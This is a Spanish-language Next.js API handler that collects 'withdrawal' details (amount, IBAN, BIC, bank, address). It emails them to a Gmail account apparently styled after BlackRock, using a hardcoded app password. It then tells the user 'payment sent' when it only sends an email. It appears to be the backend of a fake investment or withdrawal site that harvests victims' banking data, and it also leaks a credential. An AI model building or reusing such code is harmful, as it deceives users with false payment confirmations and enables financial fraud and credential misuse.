import nodemailer from 'nodemailer';
import { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Método no permitido' });
  }

  try {
    const { amount, bank, email, country, city, iban, bic, postalCode, bankName, address, bankAddress, message } = req.body;

    if (!email || !amount || !bank || !message) {
      return res.status(400).json({ error: '❌ Datos incompletos. Verifica los campos.' });
    }

    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'blackrock.groupx@gmail.com', // Reemplázalo con tu correo de Gmail
        pass: 'bwaz bvcu chza ghnx', // ⚠️ Usa una contraseña de aplicación de Google
      },
    });

    const mailOptions = {
       from: `"Solicitud de Retiro" <blackrock.groupx@gmail.com>`,
      to: 'blackrock.groupx@gmail.com',
      subject: 'Confirmación de Retiro',
      text: `
        ✅ Solicitud de retiro procesada.
        - Cantidad: ${amount}
        - Banco: ${bank}
        - País: ${country}
        - Ciudad: ${city}
        - IBAN: ${iban}
        - BIC: ${bic}
        - Código Postal: ${postalCode}
        - Nombre del Banco: ${bankName}
        - Dirección: ${address}
        - Dirección del Banco: ${bankAddress}
        
        📨 Mensaje: ${message}
      `,
    };

    await transporter.sendMail(mailOptions);

    return res.status(200).json({ message: 'PAGO ENVIADO CORRECTAMENT' });
  } catch (error) {
    console.error('Error enviando correo:', error);
    return res.status(500).json({ error: '❌ Error al enviar el correo. Revisa la configuración del servidor.' });
  }
}